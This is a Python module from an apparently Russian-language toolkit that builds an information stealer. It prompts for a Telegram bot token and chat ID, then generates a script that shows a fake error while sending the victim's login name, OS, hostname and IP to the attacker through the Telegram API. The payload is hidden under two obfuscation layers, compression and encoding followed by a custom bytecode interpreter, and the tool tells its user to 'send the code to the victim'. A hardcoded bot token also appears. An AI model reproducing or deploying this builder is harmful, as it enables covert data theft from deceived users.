from modules.imports import *
from modules.config import *
from modules.console import *
from modules.input import *
from modules.api import *

def _r(n=24):
    return "_" + "".join(random.choice(string.ascii_letters) for _ in range(n))

def encode_custom_bytecode(s: str) -> str:
    res = ""
    for ch in s:
        if ch == ",": res += "<,."
        elif ch == "\n": res += "<\\n."
        elif ch == " ": res += "< ."
        else: res += "<" + ch + "."
    res += ">"
    return res

def _layer2(source: str) -> str:
    custom_bc = encode_custom_bytecode(source)
    compressed = zlib.compress(custom_bc.encode(), 9)
    payload = base64.b64encode(compressed).decode()
    V_PAY = _r(); V_RUN = _r(); V_VM = _r()
    return f'''
import base64, zlib
{V_PAY} = "{payload}"
def {V_VM}(code):
    stack = []; out = []; i = 0
    while i < len(code):
        c = code[i]; i += 1
        if c == "<":
            if i < len(code): stack.append(ord(code[i])); i += 1
        elif c == ".":
            if stack: out.append(chr(stack.pop()))
        elif c == ">": break
    exec("".join(out), {{}})
def {V_RUN}():
    data = base64.b64decode({V_PAY}.encode())
    data = zlib.decompress(data).decode()
    {V_VM}(data)
{V_RUN}()
'''

def _layer1(source: str) -> str:
    encoded = base64.b85encode(zlib.compress(source.encode(), 9)).decode()
    V_MOD = _r(); V_FILE = _r()
    return f'''
import base64, zlib
{V_MOD} = types.ModuleType("{V_MOD}")
{V_MOD}.__file__ = "{V_FILE}"
exec(compile(zlib.decompress(base64.b85decode(b"{encoded}")).decode(), "{V_FILE}", "exec"), {V_MOD}.__dict__)
'''

def stealer_builder():
    console.print('[warning]ВАЖНО![/warning]\nМы не отвечаем за ваши действия, и то что вы будете делать с кодом который выйдет.')
    token = v2i('Telegram бот токен', f'{USERNAME}@{UUID}', default='8612825768:AAFv2RAQHGm-WPqZ7E8U614bsjKhNFTNBAM4').strip()
    chat_id = v2i('Telegram айди (ваш)', f'{USERNAME}@{UUID}').strip()
    if not token or not chat_id:
        return
    
    raw_source = f'''
try:
    import os;import platform;import socket;import requests
except ImportError:
    import os;os.system('pip install platform requests --break-system-packages')

print('Ошибка! Попробуйте запустить данный скрипт позже.')
def send():
    TOKEN = "{token}"; CHAT_ID = "{chat_id}"
    inf = [f"User: {{os.getlogin()}}", f"OS: {{platform.system()}}", f"Host: {{socket.gethostname()}}", f"IP: {{socket.gethostbyname(socket.gethostname())}}"]
    msg = "📱 *System*\\n" + "\\n".join(f"• {{line}}" for line in inf)
    requests.post(f"https://api.telegram.org/bot{{TOKEN}}/sendMessage", json={{ "chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown" }}, timeout=5)
send()
'''
    clean_code = _layer2(_layer1(raw_source))
    
    console.print('\n[secondary]Готово![/secondary] Отправьте код жертве.\n')
    print(clean_code)